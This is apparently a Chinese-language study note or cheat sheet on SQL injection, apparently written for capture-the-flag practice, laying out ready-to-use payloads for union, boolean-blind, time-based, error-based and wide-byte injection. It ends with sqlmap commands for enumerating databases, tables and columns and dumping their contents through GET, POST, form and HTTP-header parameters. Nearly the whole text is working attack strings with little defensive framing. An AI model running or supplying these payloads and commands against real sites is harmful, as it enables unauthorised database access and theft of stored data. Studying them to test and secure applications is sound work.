<p>#Sql注入总结</p>
<h2 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>1、利用闭合变量报错测试注入点， <code>?id=1’</code>这样说明存在单引号闭合注入<br>2、是否存在注入点，用and语句测试<br><code>?id=1’ and 1=2# ?id=1’ and 1=1#</code><br>3、猜测字段<br><code>?id=1’ order by 3%23</code><br>4、找到页面中数据输入点<br> <code>?id=-1’ union select 1,2,3%23</code><br>5、查数据库<br><code>?id=1’ union select 1,schema_name from information_schema.schemata,3%23</code><br>6、查表<br><code>?id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database()%23</code><br>7、查字段<br><code>?id=-1’ union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;%23</code><br>8、查数据<br><code>?id=-1’ union select 1,flag,3 from 数据库.表名%23</code></p>
<h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><p>1、判断是否存在注入点<br><code>?id=1’ and 1=1%23</code>（返回ture页面）<br><code>?id=1’ and 1=2%23</code> （返回false页面）<br>存在布尔型盲注<br>2、查数据库长度<br><code>id=1’ and (length(database()))&gt;7%23</code>返回ture页面说明长度大于7<br><code>id=1’ and (length(database()))&gt;20%23</code>返回false页面说明长度小于20<br>利用二分法最终确定数据库长度<br>如果id=1’ and (length(database()))=12%23 返回ture说明数据库长度为12<br>3、查数据库<br><code>?id=1’and ascii(substr(database(),2,1))&gt;114%23</code>（对查询的数据取第一位判断）<br>substr(a,b,c)是截取字符函数。a=截取对象 b=截取的位数 c=截取的个数<br>substr(database(),1,1)是取出数据库的第一位的值。<br>4、查表<br><code>?id=1’ and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1)))&gt;130%23</code>（利用二分法，ascii为ascii码，例如97=‘a’）<br>7、查列：<br><code>?id=1’ and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=‘表名’ limit 0,1),1,1)))&gt;0%23</code> (如果报错可以加limit 0,1)<br>8、查字段<br><code>?id=1’ and length((select username from 数据库.表名 limit 0,1))&gt;0%23</code></p>
<p>###延时型<br>是由返回响应的时间判断的。利用此函数sleep（）与if()<br>判断：<br><code>?id=1’ and sleep(5)%23</code><br>响应时间5秒存在延时注入<br>查数据库<br><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)%23</code><br>其他操作语法与布尔型一样。</p>
<h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p>
<p>1.直接使用报错：<br><code>&#39; union select 1,count(*),concat(&#39;/&#39;,(select database()),&#39;/&#39;,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
<p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，注意返回值不能超过一行，如果多行数据加limit<br>2.利用xpath函数-extractvalue报错<br>payload：<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p>
<p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br>3.利用xpath函数—updatexml报错：<br>payload:<br><code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
<p>与extractvalue同理，这里不再赘述</p>
<p>###宽字节注入<br>测试<br>?id=1’ and 1=2%23 没反应<br>?id=1’ %df’ and 1=2%23 页面返回假。说明存在宽字节注入<br>后面与前面语法一样。不过都得?id=1’ %df’ 有%df进行注入</p>
<p>##sqlmap使用</p>
<h3 id="get方式"><a href="#get方式" class="headerlink" title="get方式"></a>get方式</h3><p>查所有数据库<br><code>Sqlmap -u “url” --dbs</code><br>当前数据库<br><code>Sqlmap -u “url” --current-db</code><br>表<br><code>Sqlmap -u “url” -D 数据库 --tables</code><br>列<br><code>Sqlmap -u “url” -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -u “url” -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p>
<h3 id="post方式"><a href="#post方式" class="headerlink" title="post方式"></a>post方式</h3><p>1.先用burp抓包，如下<br><img src="./1579160162571.png" alt="Alt text"><br>将数据包copy to file<br>保存到”C:\Users\Administrator\Desktop\1.txt”<br>2.python sqlmap.py -r “请求包的路径” -p “注入点”<br>查所有数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --dbs (-r为保存的txt文件路径，-p为存在注入的参数，这里是id)</code><br>当前数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --current-db</code><br>查所有表<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 --tables</code><br>列<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p>
<p>第二种方法<br>如post id=1存在注入<br>sqlmap -u“url”–data=“id=1”</p>
<p>第三种方法<br>在表单中，例如登陆页面，如果不知道那个参数存在注入<br>sqlmap.py -u “url” –forms<br>然后一直点y即可。</p>
<h3 id="http头部注入"><a href="#http头部注入" class="headerlink" title="http头部注入"></a>http头部注入</h3><p>referrer头<br>sqlmap -u “url” –dbs –level 3<br>(可能要跑很久</p>
<p>host头<br>sqlmap -u “url” –dbs –level 5</p>
<p>user-agent<br>sqlmap -u “url” –user-agent –dbs –level 3</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>sqlmap -u “url?id=1%df’”</p>
